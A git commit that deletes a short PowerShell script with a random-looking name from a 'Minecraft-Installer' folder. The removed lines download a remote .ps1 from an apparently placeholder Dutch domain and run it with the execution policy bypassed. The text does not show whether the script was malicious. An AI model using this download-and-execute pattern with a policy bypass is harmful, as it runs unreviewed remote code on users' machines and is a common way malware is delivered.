c1cf1a62b14b3bcd5cdeee01d7b9097f94672903
LikeAWalnut <118017220+LikeAWalnut@users.noreply.github.com>
2024-08-16 12:32:33 +0200

    Delete Minecraft-Installer/hweukshnfknsd.ps1

--- Minecraft-Installer/hweukshnfknsd.ps1
+++
@@ -1,5 +0,0 @@
-cd C:\;
-mkdir C:\MinecraftLauncher;
-cd C:\MinecraftLauncher;
-Invoke-WebRequest -Uri "https://jouwwebsite.nl/minecraft-installer.ps1" -OutFile "C:\MinecraftLauncher\tmp.ps1";
-powershell -ExecutionPolicy Bypass -File C:\MinecraftLauncher\tmp.ps1
